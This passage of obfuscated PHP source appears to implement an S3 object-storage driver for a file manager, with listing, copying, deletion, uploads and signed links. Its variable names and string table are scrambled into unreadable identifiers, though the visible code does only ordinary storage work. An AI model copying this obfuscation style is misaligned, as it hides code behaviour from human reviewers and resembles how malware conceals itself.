strlen($ğ¢ïó«½)); $åÍ’ŸÍ = $òİ¬«’¼ . "\x28{$ÈÛšË·Ñ}\x29{$ğ¢ïó«½}"; while ($this->exist(rtrim($ËÔ×ˆì®, $ã®ß¤‹Ë[8]) . $ã®ß¤‹Ë[8] . $åÍ’ŸÍ)) { $åÍ’ŸÍ = $òİ¬«’¼ . "\50{$ÈÛšË·Ñ}\51{$ğ¢ïó«½}"; $ÈÛšË·Ñ++; } return $åÍ’ŸÍ; } private function fileNameAutoList($áÃ¬Êµ, $²Ï•ôå‰, $İïœ“Ş† = false) { $­”Ïê† =& $_SERVER[íïàËŸë]; $™¡¿­Õâ = $this->listPath($áÃ¬Êµ, !0); $™¡¿­Õâ = array_merge($™¡¿­Õâ[$­”Ïê†[85]], $™¡¿­Õâ[$­”Ïê†[86]]); $ô±–èÚÁ = array_to_keyvalue($™¡¿­Õâ, $­”Ïê†[12], $­”Ïê†[32]); $©©îÇõÕ = $­”Ïê†[10] . get_path_ext($²Ï•ôå‰); $©©îÇõÕ = $©©îÇõÕ == $­”Ïê†[10] || $İïœ“Ş† ? $­”Ïê†[12] : $©©îÇõÕ; $Í´­Ô¨­ = substr($²Ï•ôå‰, 0, strlen($²Ï•ôå‰) - strlen($©©îÇõÕ)); $µ¨Ñ³”¹ = $Í´­Ô¨­ . "\50\x30\51{$©©îÇõÕ}"; for ($®“¹Å³ = 1; $®“¹Å³ <= count($ô±–èÚÁ) + 1; $®“¹Å³++) { $µ¨Ñ³”¹ = $Í´­Ô¨­ . "\x28{$®“¹Å³}\51{$©©îÇõÕ}"; if (!in_array_not_case($µ¨Ñ³”¹, $ô±–èÚÁ)) { return $µ¨Ñ³”¹; } } return $µ¨Ñ³”¹; } public function listAllFiles($»Ö»ˆÄô, $öê«öÚ) { $†ô›ø =& $_SERVER[íïàËŸë]; if (empty($öê«öÚ)) { return array(); } $û•À¯Œ = array_keys($öê«öÚ); $ëÏÄ‹éñ = array(); $»Ö»ˆÄô = trim($»Ö»ˆÄô, $†ô›ø[8]); foreach ($öê«öÚ as $ÕÑÙ©·û => $¨œ¥ş×Ô) { $‡æÛºö = ltrim(substr(trim($ÕÑÙ©·û, $†ô›ø[8]), strlen($»Ö»ˆÄô)), $†ô›ø[8]); if (substr($ÕÑÙ©·û, -1) == $†ô›ø[8]) { $‡æÛºö = rtrim($‡æÛºö, $†ô›ø[8]) . $†ô›ø[8]; } $ëÏÄ‹éñ = array_merge($ëÏÄ‹éñ, $this->slicePath($‡æÛºö)); } $ÇİÊÜ§· = array(); foreach (array_unique($ëÏÄ‹éñ) as $•±ÓŠ´) { $Ùµ¿Õ’ô = array($†ô›ø[87] => $this->getPathOuter($†ô›ø[8] . $»Ö»ˆÄô . $†ô›ø[8] . $•±ÓŠ´), $†ô›ø[78] => 1, $†ô›ø[79] => 0); if (substr($•±ÓŠ´, -1) != $†ô›ø[8]) { $Ùµ¿Õ’ô[$†ô›ø[78]] = 0; $Ô¬Î²Åõ = $this->getPath($»Ö»ˆÄô . $†ô›ø[8] . $•±ÓŠ´); if (isset($öê«öÚ[$Ô¬Î²Åõ])) { $ˆºŸ¸ÏÇ = $öê«öÚ[$Ô¬Î²Åõ]; if (isset($ˆºŸ¸ÏÇ[$†ô›ø[79]])) { $Ùµ¿Õ’ô[$†ô›ø[79]] = intval($ˆºŸ¸ÏÇ[$†ô›ø[79]]); } if (isset($ˆºŸ¸ÏÇ[$†ô›ø[206]])) { $Ùµ¿Õ’ô[$†ô›ø[88]] = intval($ˆºŸ¸ÏÇ[$†ô›ø[206]]); } } } $ÇİÊÜ§·[] = $Ùµ¿Õ’ô; } return $ÇİÊÜ§·; } public function slicePath($´À¯°Ì) { $Ñ‰À¥ß‡ =& $_SERVER[íïàËŸë]; $¿›ìé¬Ò = explode($Ñ‰À¥ß‡[8], trim($´À¯°Ì, $Ñ‰À¥ß‡[8])); $ÒöŒ¹·‡ = 0; do { ++$ÒöŒ¹·‡; $¡ìëÙè¶[] = implode($Ñ‰À¥ß‡[8], array_slice($¿›ìé¬Ò, 0, $ÒöŒ¹·‡)) . $Ñ‰À¥ß‡[8]; } while ($ÒöŒ¹·‡ < count($¿›ìé¬Ò)); $¡ìëÙè¶[count($¿›ìé¬Ò) - 1] = $´À¯°Ì; return $¡ìëÙè¶; } public function getHost() { $£û—•¬ =& $_SERVER[íïàËŸë]; $Ğ’¨À‹à = parse_url(trim($this->domain, $£û—•¬[8])); $ú¦ö¹ÇÄ = isset($Ğ’¨À‹à[$£û—•¬[207]]) ? $Ğ’¨À‹à[$£û—•¬[207]] : http_type(); $Ûİ †Û¦ = isset($Ğ’¨À‹à[$£û—•¬[208]]) ? $Ğ’¨À‹à[$£û—•¬[208]] : $Ğ’¨À‹à[$£û—•¬[87]]; if (isset($Ğ’¨À‹à[$£û—•¬[209]])) { $Ûİ †Û¦ .= $£û—•¬[4] . $Ğ’¨À‹à[$£û—•¬[209]]; } return $ú¦ö¹ÇÄ . $£û—•¬[210] . $Ûİ †Û¦; } public function pathEncode($à§òÌ) { $€Ë±ÉÂ =& $_SERVER[íïàËŸë]; return str_replace($€Ë±ÉÂ[211], $€Ë±ÉÂ[8], rawurlencode($à§òÌ)); } public function writeLog($ëÁ¿ò—¶ = '', $¥Ó±éÕ = false) { $ò­Ú„ş« =& $_SERVER[íïàËŸë]; $­÷Ş«‰¦ = in_array(ACTION, array($ò­Ú„ş«[212], $ò­Ú„ş«[213])); if (!$­÷Ş«‰¦ && !GLOBAL_DEBUG) { return; } $¢©Ö¨¨× = $ëÁ¿ò—¶; static $¸îñ„£ = null; if (!$¸îñ„£) { $¸îñ„£ = strtoupper($this->getType()); } $ëÁ¿ò—¶ = $¸îñ„£ . $ò­Ú„ş«[214] . $ëÁ¿ò—¶; if ($¥Ó±éÕ) { $—ğ—ˆÉì = error_get_last(); if ($—ğ—ˆÉì) { $ëÁ¿ò—¶ = array($ëÁ¿ò—¶, $—ğ—ˆÉì); } } write_log($ëÁ¿ò—¶, $ò­Ú„ş«[215]); if ($­÷Ş«‰¦) { throw new Exception($¢©Ö¨¨×); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($¦¾Â÷İ“) { set_timeout(); require_once SDK_DIR . $_SERVER[íïàËŸë][216]; parent::__construct(); $this->_init($¦¾Â÷İ“); } public function _init($Å¢ç½©û) { $Í˜±õ‰ =& $_SERVER[íïàËŸë]; $this->config = $Å¢ç½©û; foreach ($Å¢ç½©û as $²ÌË²ÏÓ => $õ”±’Ì®) { if (isset($this->{$²ÌË²ÏÓ})) { $this->{$²ÌË²ÏÓ} = $õ”±’Ì®; } } $this->endpoint = $Å¢ç½©û[$Í˜±õ‰[217]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); if (in_array(ACTION, array($Í˜±õ‰[212], $Í˜±õ‰[213]))) { $this->client->setExceptions(); } } public function setSignVersion($˜÷ˆÉ†¥ = "\166\x34") { $this->signVer = $˜÷ˆÉ†¥; $this->client->setSignatureVersion($˜÷ˆÉ†¥); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $ı÷Ÿ æŞ) { return null; } } public function isBucketCors() { $ÀÉ‹ñ„Ë =& $_SERVER[íïàËŸë]; $ş“úĞÛ = $this->getBucketCors(); if (!$ş“úĞÛ || !is_array($ş“úĞÛ)) { return !1; } if (!is_array($ş“úĞÛ[$ÀÉ‹ñ„Ë[218]])) { $ş“úĞÛ[$ÀÉ‹ñ„Ë[218]] = explode($ÀÉ‹ñ„Ë[50], $ş“úĞÛ[$ÀÉ‹ñ„Ë[218]]); } if ($ş“úĞÛ[$ÀÉ‹ñ„Ë[219]] != $ÀÉ‹ñ„Ë[220] || !in_array($ÀÉ‹ñ„Ë[220], $ş“úĞÛ[$ÀÉ‹ñ„Ë[218]])) { return !1; } $Ù×ß—çÒ = array_map($ÀÉ‹ñ„Ë[221], $ş“úĞÛ[$ÀÉ‹ñ„Ë[222]]); if (!is_array($Ù×ß—çÒ)) { $Ù×ß—çÒ = array(); } $èìã¥â§ = array($ÀÉ‹ñ„Ë[223], $ÀÉ‹ñ„Ë[224], $ÀÉ‹ñ„Ë[225], $ÀÉ‹ñ„Ë[226], $ÀÉ‹ñ„Ë[227]); $õçµÚÂ± = array_diff($èìã¥â§, $Ù×ß—çÒ); return empty($õçµÚÂ±); } public function getBucketRgn() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($¤üÔ¡â„, $¹çˆ¸â = '', $âş¿‹š = REPEAT_RENAME) { $†®øÕËİ = $this->setContent($¤üÔ¡â„, $¹çˆ¸â); if ($†®øÕËİ !== !1) { return $this->getPathOuter($¤üÔ¡â„); } return !1; } public function mkdir($Ò€ñŒº, $¿Ü×®ÆÀ = REPEAT_SKIP) { $¹èˆÉã£ =& $_SERVER[íïàËŸë]; if (empty($Ò€ñŒº) && $Ò€ñŒº !== $¹èˆÉã£[228]) { return !1; } if ($¿Ü×®ÆÀ && $this->_isFolder($Ò€ñŒº)) { return $this->getPathOuter($Ò€ñŒº); } $¨èˆÓ© = $this->setContent($Ò€ñŒº, $¹èˆÉã£[12], !0); if ($¨èˆÓ© !== !1) { return $this->getPathOuter($Ò€ñŒº); } return !1; } public function copyFile($¾öÛŒ›‹, $èø×–£Á, $§¹¨æ‡‰ = array()) { $éÕ¾ˆ‘µ =& $_SERVER[íïàËŸë]; $ÃÓ„Ë = $this->objectMeta($¾öÛŒ›‹); if (!$ÃÓ„Ë) { return !1; } if ($ÃÓ„Ë[$éÕ¾ˆ‘µ[79]] <= 1024 * 1024 * 200) { $íè÷”øû = $this->client->copyObject($this->bucket, $¾öÛŒ›‹, $this->bucket, $èø×–£Á, $éÕ¾ˆ‘µ[229], $§¹¨æ‡‰); } else { $íè÷”øû = $this->client->multiCopyObject($this->bucket, $¾öÛŒ›‹, $this->bucket, $èø×–£Á, $§¹¨æ‡‰); } $íè÷”øû = $íè÷”øû ? $this->getPathOuter($èø×–£Á) : !1; return $íè÷”øû; } public function moveFile($õíîßàó, $åëåı„ö) { if ($this->copyFile($õíîßàó, $åëåı„ö)) { $this->delFile($õíîßàó); return $this->getPathOuter($åëåı„ö); } return !1; } public function delFile($Ğ²—Ô†õ) { return $this->client->deleteObject($this->bucket, $Ğ²—Ô†õ); } public function delFolder($¿­ê’Ö¥) { $Ş«¡¬½› =& $_SERVER[íïàËŸë]; if (!$this->exist($¿­ê’Ö¥)) { return !0; } $this->listItemCache = !1; $µÅÀëí = $this->fileList($¿­ê’Ö¥); $this->listItemCache = !0; $”Åâ³§ = trim($¿­ê’Ö¥, $Ş«¡¬½›[8]) . $Ş«¡¬½›[8]; if (!empty($¿­ê’Ö¥) && $¿­ê’Ö¥ !== $Ş«¡¬½›[228] && !in_array($”Åâ³§, $µÅÀëí[$Ş«¡¬½›[85]])) { $µÅÀëí[$Ş«¡¬½›[85]][] = $”Åâ³§; } $€·¬ÜÚ» = $this->delByBatch($µÅÀëí[$Ş«¡¬½›[86]]); if (!$€·¬ÜÚ») { return !1; } $€·¬ÜÚ» = $this->delByBatch($µÅÀëí[$Ş«¡¬½›[85]]); if (!$€·¬ÜÚ») { return !1; } return $this->delFile($”Åâ³§); } private function delByBatch($ŒÑƒõ§) { foreach (array_chunk($ŒÑƒõ§, 1000) as $Ä±À¡ªß) { $¢Ÿú˜Š‹ = $this->client->deleteObjects($this->bucket, $Ä±À¡ªß); if (!$¢Ÿú˜Š‹) { return !1; } } return !0; } public function rename($ê…ß§Ş, $Öƒî°ä·) { return $this->renameObject($ê…ß§Ş, $Öƒî°ä·); } public function listPath($ä‡²å®¡, $ÖşŞ—ø² = false) { $éšş½’ =& $_SERVER[íïàËŸë]; $€ÆíšòÁ = $this->fileList($ä‡²å®¡, $éšş½’[8], !0); foreach ($€ÆíšòÁ[$éšş½’[85]] as $ÀÛ˜ä’Ê => $çõİ‡¼Œ) { $€ÆíšòÁ[$éšş½’[85]][$ÀÛ˜ä’Ê] = $this->folderInfo($çõİ‡¼Œ, $ÖşŞ—ø², $çõİ‡¼Œ); } foreach ($€ÆíšòÁ[$éšş½’[86]] as $ÀÛ˜ä’Ê => $çõİ‡¼Œ) { $€ÆíšòÁ[$éšş½’[86]][$ÀÛ˜ä’Ê] = $this->fileInfo($çõİ‡¼Œ[$éšş½’[32]], $ÖşŞ—ø², $çõİ‡¼Œ); } return $€ÆíšòÁ; } protected function infoChildren($²ŸÉ·î, &$«ÎÚË°½) { $Ü³»¼£ª =& $_SERVER[íïàËŸë]; $í€„İÌì = $this->fileList($²ŸÉ·î, $Ü³»¼£ª[12], !0); $«ÎÚË°½[$Ü³»¼£ª[81]] += count($í€„İÌì[$Ü³»¼£ª[85]]); $«ÎÚË°½[$Ü³»¼£ª[80]] += count($í€„İÌì[$Ü³»¼£ª[86]]); foreach ($í€„İÌì[$Ü³»¼£ª[86]] as $›®™‹ıâ) { if (!$›®™‹ıâ || !$›®™‹ıâ[$Ü³»¼£ª[79]]) { continue; } $«ÎÚË°½[$Ü³»¼£ª[79]] += $›®™‹ıâ[$Ü³»¼£ª[79]]; } } private function fileInfo($¯å¼ó¤, $Ø½ğŸ¾Í = false, $¾»µ¸ÓÙ = array()) { $ª€ûıî =& $_SERVER[íïàËŸë]; $öÉõäç = array($ª€ûıî[32] => $this->pathThis($¯å¼ó¤), $ª€ûıî[87] => $this->getPathOuter($¯å¼ó¤), $ª€ûıî[33] => $ª€ûıî[230], $ª€ûıî[169] => $this->ext($¯å¼ó¤), $ª€ûıî[79] => isset($¾»µ¸ÓÙ[$ª€ûıî[79]]) ? $¾»µ¸ÓÙ[$ª€ûıî[79]] : 0); if ($Ø½ğŸ¾Í) { return $öÉõäç; } $öÉõäç[$ª€ûıî[231]] = $öÉõäç[$ª€ûıî[88]] = 0; $öÉõäç[$ª€ûıî[232]] = $öÉõäç[$ª€ûıî[233]] = !0; if (empty($¾»µ¸ÓÙ)) { $¾»µ¸ÓÙ = $this->objectMeta($¯å¼ó¤); if (!$¾»µ¸ÓÙ) { return $öÉõäç; } } if (isset($¾»µ¸ÓÙ[$ª€ûıî[234]]) && $¾»µ¸ÓÙ[$ª€ûıî[234]]) { $öÉõäç[$ª€ûıî[235]] = $¾»µ¸ÓÙ[$ª€ûıî[234]]; } if (isset($¾»µ¸ÓÙ[$ª€ûıî[206]])) { $öÉõäç[$ª€ûıî[88]] = $¾»µ¸ÓÙ[$ª€ûıî[206]]; } if (isset($¾»µ¸ÓÙ[$ª€ûıî[79]])) { $öÉõäç[$ª€ûıî[79]] = $¾»µ¸ÓÙ[$ª€ûıî[79]]; } return $öÉõäç; } private function folderInfo($ùŠ¶æï†, $­æÖÎû = false, $²ùÈËÓ¤ = array()) { $¬ì—„ƒÀ =& $_SERVER[íïàËŸë]; $º¶ô™Ê = array($¬ì—„ƒÀ[32] => $this->pathThis($ùŠ¶æï†), $¬ì—„ƒÀ[87] => $this->getPathOuter($¬ì—„ƒÀ[8] . $ùŠ¶æï†), $¬ì—„ƒÀ[33] => $¬ì—„ƒÀ[78]); if ($­æÖÎû) { return $º¶ô™Ê; } $º¶ô™Ê[$¬ì—„ƒÀ[231]] = $º¶ô™Ê[$¬ì—„ƒÀ[88]] = 0; $º¶ô™Ê[$¬ì—„ƒÀ[232]] = $º¶ô™Ê[$¬ì—„ƒÀ[233]] = !0; if ($ùŠ¶æï† == $¬ì—„ƒÀ[12]) { return $º¶ô™Ê; } if (empty($²ùÈËÓ¤)) { $²ùÈËÓ¤ = $this->objectMeta(trim($ùŠ¶æï†, $¬ì—„ƒÀ[8]) . $¬ì—„ƒÀ[8]); } if (isset($²ùÈËÓ¤[$¬ì—„ƒÀ[206]])) { $º¶ô™Ê[$¬ì—„ƒÀ[231]] = $²ùÈËÓ¤[$¬ì—„ƒÀ[206]]; } return $º¶ô™Ê; } private function fileList($êäèˆ›Ø, $¿Í÷ = '', $ò×Â¼” = 0) { $øµÔÃÑ‘ =& $_SERVER[íïàËŸë]; $®§ïÎÙÅ = rtrim($êäèˆ›Ø, $øµÔÃÑ‘[8]) . $øµÔÃÑ‘[8]; $±š¾¬š™ = $this->listObjs($®§ïÎÙÅ, null, null, $¿Í÷); if (!$±š¾¬š™) { return array($øµÔÃÑ‘[85] => array(), $øµÔÃÑ‘[86] => array()); } $­ú¥°¢­ = $ªÂ˜¶ø = array(); foreach ($±š¾¬š™[$øµÔÃÑ‘[236]] as $˜ØßñÅ§) { $ü¯Ôğûæ = $˜ØßñÅ§[$øµÔÃÑ‘[32]]; if ($ü¯Ôğûæ == $®§ïÎÙÅ) { continue; } $ùĞø…âé = isset($˜ØßñÅ§[$øµÔÃÑ‘[79]]) ? $˜ØßñÅ§[$øµÔÃÑ‘[79]] : 0; $•ßóğ³™ = $ùĞø…âé == 0 && substr($ü¯Ôğûæ, strlen($ü¯Ôğûæ) - 1, 1) == $øµÔÃÑ‘[8] ? !0 : !1; $this->cacheMethodInfoSet($ü¯Ôğûæ, $•ßóğ³™, $˜ØßñÅ§); if ($•ßóğ³™) { $­ú¥°¢­[] = $ü¯Ôğûæ; continue; } $ªÂ˜¶ø[] = $ò×Â¼” ? $˜ØßñÅ§ : $ü¯Ôğûæ; } foreach ($±š¾¬š™[$øµÔÃÑ‘[237]] as $˜ØßñÅ§) { $­ú¥°¢­[] = $˜ØßñÅ§[$øµÔÃÑ‘[32]]; $this->cacheMethodInfoSet($˜ØßñÅ§[$øµÔÃÑ‘[32]], !0); } $this->cacheMethodInfoSet($êäèˆ›Ø, !0); return array($øµÔÃÑ‘[85] => $­ú¥°¢­, $øµÔÃÑ‘[86] => $ªÂ˜¶ø); } private function listObjs($ŞÄ€¢ó, $Íæı’¸³ = null, $³àĞ¡×¼ = null, $œ«œ¼ú = null) { $úš¸ˆš½ =& $_SERVER[íïàËŸë]; $ŞÄ€¢ó = trim($ŞÄ€¢ó, $úš¸ˆš½[8]); $Ö±»¹İ‘ = empty($ŞÄ€¢ó) && $ŞÄ€¢ó !== $úš¸ˆš½[228] ? $úš¸ˆš½[12] : $ŞÄ€¢ó . $úš¸ˆš½[8]; return $this->client->getBucket($this->bucket, $Ö±»¹İ‘, $Íæı’¸³, $³àĞ¡×¼, $œ«œ¼ú, !0); } public function has($ùÁà‰¶ı, $ôÔßÕ¥í = false, $ÏìÌ¥Şš = true) { $È›‰ìÇŞ =& $_SERVER[íïàËŸë]; $ùÁà‰¶ı = trim($ùÁà‰¶ı, $È›‰ìÇŞ[8]); $íúÙæí„ = empty($ùÁà‰¶ı) && $ùÁà‰¶ı !== $È›‰ìÇŞ[228] ? $È›‰ìÇŞ[12] : $ùÁà‰¶ı . $È›‰ìÇŞ[8]; $ƒ£ß®ŸŞ = null; $·ÅÕğ¶È = 500; $ª±´ü = $È›‰ìÇŞ[8]; $´Äéó¸ = $­ÊÑ«Šù = array(); while (!0) { $§˜´ß¾Ñ = $this->listObjs($ùÁà‰¶ı, $ƒ£ß®ŸŞ, $·ÅÕğ¶È, $ª±´ü); if (!$§˜´ß¾Ñ) { break; } $ƒ£ß®ŸŞ = $§˜´ß¾Ñ[$È›‰ìÇŞ[238]]; $¥„˜ıèä = $§˜´ß¾Ñ[$È›‰ìÇŞ[236]]; $ë¸ƒ´…Ï = $§˜´ß¾Ñ[$È›‰ìÇŞ[237]]; if (empty($¥„˜ıèä) && empty($ë¸ƒ´…Ï)) { break; } if (count($¥„˜ıèä) == 1 && $¥„˜ıèä[0][$È›‰ìÇŞ[32]] == $íúÙæí„) { break; } if ($ôÔßÕ¥í) { if (count($¥„˜ıèä)) { $¥„˜ıèä = array_column($¥„˜ıèä, $È›‰ìÇŞ[32]); $´Äéó¸ = array_merge($´Äéó¸, $¥„˜ıèä); } if (count($ë¸ƒ´…Ï)) { $ë¸ƒ´…Ï = array_column($ë¸ƒ´…Ï, $È›‰ìÇŞ[32]); $­ÊÑ«Šù = array_merge($­ÊÑ«Šù, $ë¸ƒ´…Ï); } if ($ƒ£ß®ŸŞ === null) { break; } continue; } if ($ÏìÌ¥Şš) { if (!empty($¥„˜ıèä)) { if (count($¥„˜ıèä) > 1 || isset($¥„˜ıèä[0][$È›‰ìÇŞ[32]]) && $¥„˜ıèä[0][$È›‰ìÇŞ[32]] != $íúÙæí„) { return !0; } } } else { if (!empty($ë¸ƒ´…Ï)) { return !0; } } if ($ƒ£ß®ŸŞ === null) { break; } } if ($ôÔßÕ¥í) { $´Äéó¸ = array_diff($´Äéó¸, array($íúÙæí„)); $´Äéó¸ = count(array_unique($´Äéó¸)); $­ÊÑ«Šù = count(array_unique($­ÊÑ«Šù)); return array($È›‰ìÇŞ[239] => $´Äéó¸, $È›‰ìÇŞ[240] => $­ÊÑ«Šù); } return !1; } public function listAll($¾ø†ÖûÏ) { $š³ó†ŞÊ =& $_SERVER[íïàËŸë]; $÷¼Ü¡¤„ = $this->fileList($¾ø†ÖûÏ, $š³ó†ŞÊ[12], !0); $È–å§ùí = array_to_keyvalue($÷¼Ü¡¤„[$š³ó†ŞÊ[86]], $š³ó†ŞÊ[32]); foreach ($÷¼Ü¡¤„[$š³ó†ŞÊ[85]] as $êòÈñ–¥) { if (is_string($êòÈñ–¥)) { $È–å§ùí[$êòÈñ–¥] = array($š³ó†ŞÊ[79] => 0); } } return $this->listAllFiles($¾ø†ÖûÏ, $È–å§ùí); } public function canRead($µ¸èôÇæ) { $áÛ³¨ =& $_SERVER[íïàËŸë]; $¹Š‰´¿ = $this->client->getAccessControlPolicy($this->bucket, $µ¸èôÇæ); if (!$¹Š‰´¿) { return !1; } return in_array($¹Š‰´¿, array($áÛ³¨[241], $áÛ³¨[242], $áÛ³¨[243])) ? !0 : !1; } public function canWrite($äı…ºúÎ) { $‚áÜŞÃ· =& $_SERVER[íïàËŸë]; $Çíì‘Îù = $this->client->getAccessControlPolicy($this->bucket, $äı…ºúÎ); if (!$Çíì‘Îù) { return !1; } return in_array($Çíì‘Îù, array($‚áÜŞÃ·[241], $‚áÜŞÃ·[242])) ? !0 : !1; } public function getContent($Œ“”Àáë) { return $this->client->getObject($this->bucket, $Œ“”Àáë); } public function setContent($Ï··¼Ü, $¢ÌŠôâß = '', $ÉŒ„°û± = false) { $àÊ·½œò =& $_SERVER[íïàËŸë]; $Ï··¼Ü = $ÉŒ„°û± ? trim($Ï··¼Ü, $àÊ·½œò[8]) . $àÊ·½œò[8] : $Ï··¼Ü; $ª×ÀóÇ = get_file_mime(get_path_ext($Ï··¼Ü)); $ÍºìĞ³Ü = $this->client->putObject($¢ÌŠôâß, $this->bucket, $Ï··¼Ü, $àÊ·½œò[229], array(), $ª×ÀóÇ); if (!$ÍºìĞ³Ü) { return !1; } if ($ÉŒ„°û±) { return !0; } return $ÍºìĞ³Ü ? !0 : !1; } public function fileSubstr($¶±óŒ¸, $½çøµ²„, $£ë ™¶ô) { $ûş±³£ö = $½çøµ²„ + $£ë ™¶ô - 1; return $this->client->getObject($this->bucket, $¶±óŒ¸, array($_SERVER[íïàËŸë][244] => "\x62\x79\164\x65\x73\75{$½çøµ²„}\55{$ûş±³£ö}")); } public function upload($½Õû‰™, $³‡‹èôé, $²ÏÂäÁÜ = false, $›ú¯ãı› = REPEAT_REPLACE) { $¯•¯‰Ë =& $_SERVER[íïàËŸë]; $Ã­ºß“¸ = array($¯•¯‰Ë[245] => @md5_file($³‡‹èôé)); $ûÏò–úÈ = array($¯•¯‰Ë[246] => get_file_mime(get_path_ext($½Õû‰™))); if (IO::size($³‡‹èôé) <= 1024 * 1024 * 200) { $Øí¦¢ß½ = $this->client->putObjectFile($³‡‹èôé, $this->bucket, $½Õû‰™, $¯•¯‰Ë[229], $Ã­ºß“¸, $ûÏò–úÈ); return !empty($Øí¦¢ß½) ? $this->getPathOuter($½Õû‰™) : !1; } $ËØæ„Óö = $this->client->multiUploadObject($³‡‹èôé, $this->bucket, trim($½Õû‰™, $¯•¯‰Ë[8]), $Ã­ºß“¸, $ûÏò–úÈ); return $ËØæ„Óö ? $this->getPathOuter($½Õû‰™) : !1; } public function download($Æ¬«ï€–, $±Õšò¤‹) { if (!@is_dir($this->pathFather($±Õšò¤‹)) && !IO::mkdir($this->pathFather($±Õšò¤‹))) { return !1; } $åùÑ âÊ = $this->client->getObject($this->bucket, $Æ¬«ï€–, array(), $±Õšò¤‹); return $åùÑ âÊ !== !1 ? $±Õšò¤‹ : !1; } public function link($Õªø¬Í¿, $Ä‚ş’âÄ = array()) { $ÓëÅ¦÷ =& $_SERVER[íïàËŸë]; if ($this->signVer == $ÓëÅ¦÷[247]) { return $this->client->getAuthenticatedURL($this->bucket, $Õªø¬Í¿, 3600 * 12, $Ä‚ş’âÄ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($Õªø¬Í¿, $ÓëÅ¦÷[8]), 3600 * 12, $this->region, array(), !0, $Ä‚ş’âÄ); } public function fileOut($ò¶ß“˜İ, $§ïÓá£Ğ = false, $Ğ‘Òà× = false, $š¯¬Ì— = '') { $ÎÚùİ¤• =& $_SERVER[íïàËŸë]; if ($this->isFileOutServer()) { return $this->fileOutServer($ò¶ß“˜İ, $§ïÓá£Ğ, $Ğ‘Òà×, $š¯¬Ì—); } if (!$Ğ‘Òà×) { $Ğ‘Òà× = $this->pathThis($ò¶ß“˜İ); } $Å¤ßƒÁ = get_file_mime(get_path_ext($Ğ‘Òà×)); if ($Å¤ßƒÁ == $ÎÚùİ¤•[248]) { return parent::fileOut($ò¶ß“˜İ, $§ïÓá£Ğ, $Ğ‘Òà×, $š¯¬Ì—); } $¿ç‡¿ãÈ = array($ÎÚùİ¤•[249] => $Å¤ßƒÁ); if ($§ïÓá£Ğ) { $¿ç‡¿ãÈ[$ÎÚùİ¤•[250]] = $ÎÚùİ¤•[251] . rawurlencode($Ğ‘Òà×); } else { } $ãì³Áíª = $this->link($ò¶ß“˜İ, $¿ç‡¿ãÈ); $this->fileOutLink($ãì³Áíª); } public function fileOutServer($©ìèÎõç, $Ó¢Œµ÷ğ = false, $§Èøæú = false, $ºˆèŠ­ü = '') { parent::fileOut($©ìèÎõç, $Ó¢Œµ÷ğ, $§Èøæú, $ºˆèŠ­ü); } public function fileOutImageServer($ºŒğÙ´å, $ŸÏ¸Ñò« = 250) { parent::fileOutImage($ºŒğÙ´å, $ŸÏ¸Ñò«); } public function hashMd5($àÆôøïÓ, $•ƒ¬÷¤ = '') { $ë·ò˜Î© = $this->objectMeta($àÆôøïÓ); if (!$ë·ò˜Î©) { return !1; } $•ƒ¬÷¤ = $•ƒ¬÷¤ ? $•ƒ¬÷¤ : _get($ë·ò˜Î©, $_SERVER[íïàËŸë][252]); return $•ƒ¬÷¤; } public function uploadFormData($ƒà¾•—Î, $ôˆ´İÂà = 3600) { $õªµöéù =& $_SERVER[íïàËŸë]; $åƒîÖ = $this->pathFather($ƒà¾•—Î); $Ò©Šƒ = $this->client->getHttpUploadPostParams($this->bucket, $åƒîÖ, $õªµöéù[229], $ôˆ´İÂà); return array_merge((array) $Ò©Šƒ, array($õªµöéù[208] => $this->getHost())); } public function multiUploadFormData($°ö•’‡«, $äˆü–Àª = 3600) { $Øêı‹¸€ =& $_SERVER[íïàËŸë]; $ü…Ğ‰¾Ã = gmdate($Øêı‹¸€[253]); $Ì“ÜÇòŸ = array(); $ŒşÈÌò = $this->client->getUploadId($this->bucket, $°ö•’‡«, $Ì“ÜÇòŸ); if (!$ŒşÈÌò) { return !1; } return array($Øêı‹¸€[254] => $ŒşÈÌò, $Øêı‹¸€[208] => $this->getHost() . $Øêı‹¸€[8] . $this->pathEncode($°ö•’‡«), $Øêı‹¸€[255] => $ü…Ğ‰¾Ã, $Øêı‹¸€[97] => $°ö•’‡«); } public function multiUploadAuthData($şŠü¨², $¬Íè˜Í = array()) { $Ò¼¨ñÁ­ =& $_SERVER[íïàËŸë]; $·Œ¢û = isset($¬Íè˜Í[$Ò¼¨ñÁ­[255]]) ? $¬Íè˜Í[$Ò¼¨ñÁ­[255]] : gmdate($Ò¼¨ñÁ­[253]); $™³’ø¹ş = isset($¬Íè˜Í[$Ò¼¨ñÁ­[169]]) ? $¬Íè˜Í[$Ò¼¨ñÁ­[169]] : $Ò¼¨ñÁ­[12]; $–²üí¾¢ = $¬Íè˜Í[$Ò¼¨ñÁ­[97]]; unset($¬Íè˜Í[$Ò¼¨ñÁ­[97]]); if (isset($¬Íè˜Í[$Ò¼¨ñÁ­[256]])) { $¬Íè˜Í[$Ò¼¨ñÁ­[255]] = $·Œ¢û; return $this->listUploadParts($–²üí¾¢, $¬Íè˜Í); } $ûğáãÌ© = array($Ò¼¨ñÁ­[257], $Ò¼¨ñÁ­[12], $Ò¼¨ñÁ­[123], $Ò¼¨ñÁ­[12], "\x78\55\141\155\172\x2d\144\141\164\x65\x3a{$·Œ¢û}", $Ò¼¨ñÁ­[8] . $this->bucket . $Ò¼¨ñÁ­[8] . $this->pathEncode($–²üí¾¢) . $™³’ø¹ş); if (strpos($™³’ø¹ş, $Ò¼¨ñÁ­[258]) === 0) { $ûğáãÌ©[0] = $Ò¼¨ñÁ­[259]; } if (isset($¬Íè˜Í[$Ò¼¨ñÁ­[260]]) && $¬Íè˜Í[$Ò¼¨ñÁ­[260]] == $Ò¼¨ñÁ­[261]) { $ûğáãÌ©[0] = $Ò¼¨ñÁ­[261]; } $ÒÂ¾ıÎ÷ = implode($Ò¼¨ñÁ­[262], 